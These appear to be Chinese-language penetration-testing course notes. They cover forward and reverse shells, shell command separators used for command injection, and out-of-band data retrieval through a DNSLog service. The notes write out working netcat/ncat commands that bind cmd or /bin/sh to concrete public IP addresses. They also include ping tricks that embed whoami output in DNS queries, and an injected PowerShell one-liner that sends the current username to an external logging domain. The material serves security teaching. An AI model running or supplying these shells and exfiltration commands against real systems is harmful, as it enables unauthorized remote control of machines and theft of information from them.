实用案例 2：反弹 Shell 命令-解决数据回显&解决数据通讯

“反弹”（Reverse Shell）是一种攻击技术，它允许攻击者从一个非信任网络中的计算

机控制另一个计算机。这通常发生在目标计算机位于防火墙或NAT（网络地址转换）

之后，直接连接到该计算机是不可行的情况下。

命令生成：https://forum.ywhack.com/shell.php

正向反向取决于参照物，谁放权谁监听

1、正向连接：本地监听等待对方连接

nc ：Linux自带 windows则需自行下载

Linux 控制 Windows

//Windows绑定 CMD 到本地 5566 端口 (不被占用的端口即可)

nc -e cmd -lvp 5566

//Linux主动连接目标 5566

ncat 47.122.23.131 5566 即可控制对方（命令提示符）（Windows的IP地址）

Windows 控制 Linux

//Linux绑定 SH 到本地 5566 端口

ncat -e /bin/sh -lvp 5566

//Windows主动连接目标 5566

nc 47.94.236.117 5566 (Linux的IP的地址)

2、反向连接：主动给出去自己的权限，让对方监听

Linux让Windows控制

//Linux绑定 CMD 到目标 5566 端口

ncat -e /bin/sh 47.122.23.131 5566 （Windows的IP地址）

/ /Windows等待 5566 连接

nc -lvvp 5566

Windows让Linux控制

//Windows绑定 CMD 到目标 5566 端口

nc -e cmd 47.94.236.117 5566 （Linux的IP地址）

//Linux等待 5566 连接

ncat -lvvp 5566

解决问题：你在外网要控制内网的某一台机器的权限

正向你只能找到路由器，找不到对应之下的具体某一台机器，只能反向让它找你

演示理解：

开一台Windows虚拟机，在其ipconfig得自身内网IP，在游览器输入IP得自身外网IP

Linux主动监听内网IP，发现连不上，Linux主动监听外网IP，发现也连不上

只能反向，Windows让Linux控制

解决问题：你在内网要控制外网的某一台机器的权限

主动正向连接即可

两边都内网则需要一个中间人

实际案例 3：防火墙绕过-正向连接&反向连接&内网服务器

管道符：command1 ？？ command2

| (管道符号) :将command1的输出作为command2的输入

||（逻辑或）如果command1执行失败（返回非零退出状态），则执行command2

&(后台任务符号) 执行command1，并在后台执行command2，两者互不影响

&&（逻辑与） 如果command1执行成功（返回零退出状态），则执行command2

; （命令分隔符）执行command1，然后执行command2，两者顺序执行，不关心前一个命令的执行结果

`` (反引号) command：执行command，并将其输出作为其他命令的参数

Windows-> | & || &&

Linux->; | || & && `` (特有’’和;)

‘’即为``,这里markdown不好书写 (Esc键下)

Linux例子：

ping -c 1 127.0.0.1 ; whoami

ping -c 1 127.0.0.1 | whoami whoami不使用标准输入

ping -c 1 127.0.0.1 || whoami

ping -c 1 127.0.0.1 & whoami

ping -c 1 127.0.0.1 && whoami

ping -c 1 127.0.0.1 ‘whoami’ ping命令不接受命令替换的输出作为参数

whoami 是一个在大多数操作系统中的命令行工具，它的作用是打印当前登录用户的用户名。这个命令通常用于确定当前用户身份，尤其是在脚本中，当需要根据不同的用户执行不同的操作时。返回administrator是Windows的 返回root是Linux

实际案例 4：防火墙组合数据不回显-ICMP 带外查询 Dnslog

入站出站都开启策略（数据不回显）：OSI网络七层

漏洞有，但数据不回显 ping完后没有回显不知道有没有执行

1，反弹shell

2，带外查询

在DNSLog平台 Get SubDomain e24a3l.dnslog.cn

Linux上 ping e24a3l.dnslog.cn 平台上回显 e24a3l.dnslog.cn

Linux上 ping whoami.e24a3l.dnslog.cn 平台上回显 whoami.e24a3l.dnslog.cn

Linux上 ping ‘whoami`e24a3l.dnslog.cn 平台上回显 root.e24a3l.dnslog.cn

但是Windows不支持这种带外查询，怎么办？

使用powershell命令(Window7后自带)，怎么玩

powershell

$x=whoami;$x=$x.Replace(‘\ ‘,’xxx’);$y=’.e24a3l.dnslog.cn’;$z=$x+$y;

ping $z

为什么要这样写

cmd无法执行whoami

用到powershell变量赋值 把whoami执行结果给变量

结果带有“\”导致ping无法执行

皮卡丘：

ping 127.0.0.1 | powershell $x=whoami;$x=$x.Replace(‘\ ‘,’xxx’);$y=’.e24a3l.dnslog.cn’;$z=$x+$y;ping $z
